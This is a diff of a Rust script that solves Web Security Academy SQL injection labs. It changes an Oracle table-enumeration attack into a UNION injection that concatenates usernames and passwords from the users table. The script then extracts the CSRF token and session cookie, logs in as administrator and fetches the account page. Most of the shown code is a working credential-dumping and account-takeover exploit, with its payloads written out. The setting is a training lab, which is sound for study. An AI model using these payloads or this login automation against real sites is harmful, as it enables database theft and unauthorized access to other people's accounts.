@@ -2,18 +2,16 @@
 *
 * Author: Ahmed Elqalawii
 *
-* Date: 16/9/2023
+* Date: 21/9/2023
 *
-* Lab: SQL injection attack, listing the database contents on Oracle
+* Lab: SQL injection UNION attack, retrieving multiple values in a single column
 *
-* Steps: 1. Inject payload into 'category' query parameter to retrieve the name of
-*           users table
-*        2. Adjust the payload to retrieve the names of username and password columns
-*        3. Adjust the payload to retrieve the administrator password
-*        4. Fetch the login page
-*        5. Extract csrf token and session cookie
-*        6. Login as the administrator
-*        7. Fetch the administrator profile
+* Steps: 1. Inject payload into 'category' query parameter to retrieve administrator 
+*           password from users table using concatenation method
+*        2. Fetch the login page
+*        3. Extract csrf token and session cookie
+*        4. Login as the administrator
+*        5. Fetch the administrator profile
 *
 ****************************************************************************************/
 #![allow(unused)]
@@ -39,7 +37,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a17002c048a8b68930a9d50002e0069.web-security-academy.net";
+    let url = "https://0a70005103c78d5081817fc50028004a.web-security-academy.net";
     // build the client used in all subsequent requests
     let client = build_client();
 
@@ -50,96 +48,30 @@ fn main() {
     );
     print!(
         "{}",
-        "1. Injecting a payload to retrieve the name of users table.. ".white(),
+        "1. Retrieving administrator password from users table.. ".white(),
     );
     io::stdout().flush();
     // payload to retreive the name of users table
-    let users_table_payload = "' union SELECT table_name, null from all_tables-- -";
-    // fetch the page with the injected payload
-    let users_table_injection = client
-        .get(format!("{url}/filter?category={users_table_payload}"))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to fetch the page with the injected payload to retreive the name of users table"
-                .red()
-        ));
-    let mut body = users_table_injection.text().unwrap();
-    // extract the name of users table
-    let users_table = capture_pattern("<th>(USERS_.*)</th>", &body).expect(&format!(
-        "{}",
-        "[!] Failed to extract the name of users table".red()
-    ));
-    println!("{} => {}", "OK".green(), users_table.yellow());
-
-    print!(
-        "{}",
-        "2. Adjusting the payload to retrieve the names of username and password columns.. "
-            .white(),
-    );
-    io::stdout().flush();
-    // payload to retreive the names of username and password columns
-    let username_password_columns_payload = format!(
-        "' union SELECT column_name, null from all_tab_columns where table_name = '{}'-- -",
-        users_table
-    );
-    // fetch the page with the injected payload
-    let username_password_columns_injection = client
-        .get(format!(
-            "{url}/filter?category={username_password_columns_payload}"
-        ))
-        .send()
-        .expect(&format!(
-            "{}",
-            "[!] Failed to fetch the page with the injected payload to retreive the name of username and password columns".red()
-        ));
-    body = username_password_columns_injection.text().unwrap();
-    // extract the name of username column
-    let username_column = capture_pattern("<th>(USERNAME_.*)</th>", &body).expect(&format!(
-        "{}",
-        "[!] Failed to extract the name of username column".red()
-    ));
-    // extract the name of password column
-    let password_column = capture_pattern("<th>(PASSWORD_.*)</th>", &body).expect(&format!(
-        "{}",
-        "[!] Failed to extract the name of password column".red()
-    ));
-    println!(
-        "{} => {} | {}",
-        "OK".green(),
-        username_column.yellow(),
-        password_column.yellow()
-    );
-
-    print!(
-        "{}",
-        "3. Adjusting the payload to retrieve the administrator password.. ".white(),
-    );
-    io::stdout().flush();
-    // payload to retreive the password of the administrator
-    let admin_password_payload = format!(
-        "' union SELECT {}, {} from {} where {} = 'administrator'-- -",
-        username_column, password_column, users_table, username_column
-    );
+    let admin_password_payload =
+        "' UNION SELECT null, concat(username , ':', password) from users-- -";
     // fetch the page with the injected payload
     let admin_password_injection = client
-        .get(format!(
-            "{url}/filter?category={admin_password_payload}"
-        ))
+        .get(format!("{url}/filter?category={admin_password_payload}"))
         .send()
         .expect(&format!(
             "{}",
-            "[!] Failed to fetch the page with the injected payload to retreive the password of the administrator".red()
+            "[!] Failed to fetch the page with the injected payload to retreive administrator password from users table"
+                .red()
         ));
-    body = admin_password_injection.text().unwrap();
-    // extract the administrator password
-    let admin_password = capture_pattern("<td>(.*)</td>", &body).expect(&format!(
+    let mut body = admin_password_injection.text().unwrap();
+    // extract the name of users table
+    let admin_password = capture_pattern("<th>administrator:(.*)</th>", &body).expect(&format!(
         "{}",
-        "[!] Failed to extract the password of the administrator".red()
+        "[!] Failed to extract the administrator password".red()
     ));
-    println!("{} => {}", "OK".green(), admin_password.yellow(),);
+    println!("{} => {}", "OK".green(), admin_password.yellow());
 
-    print!("{}", "4. Fetching login page.. ".white());
+    print!("{}", "2. Fetching login page.. ".white());
     io::stdout().flush();
     // fetch the login page
     let fetch_login = client
@@ -150,7 +82,7 @@ fn main() {
 
     print!(
         "{}",
-        "5. Extracting csrf token and session cookie.. ".white()
+        "3. Extracting csrf token and session cookie.. ".white()
     );
     io::stdout().flush();
     // extract session cookie
@@ -161,7 +93,7 @@ fn main() {
         extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));
     println!("{}", "OK".green());
 
-    print!("{}", "6. Logging in as the administrator.. ".white(),);
+    print!("{}", "4. Logging in as the administrator.. ".white(),);
     io::stdout().flush();
     // login as the administrator
     let admin_login = client
@@ -186,7 +118,7 @@ fn main() {
     ));
 
     // fetch administrator page
-    print!("{}", "7. Fetching the administrator profile.. ".white(),);
+    print!("{}", "5. Fetching the administrator profile.. ".white(),);
     io::stdout().flush();
     let admin = client
         .get(format!("{url}/my-account"))
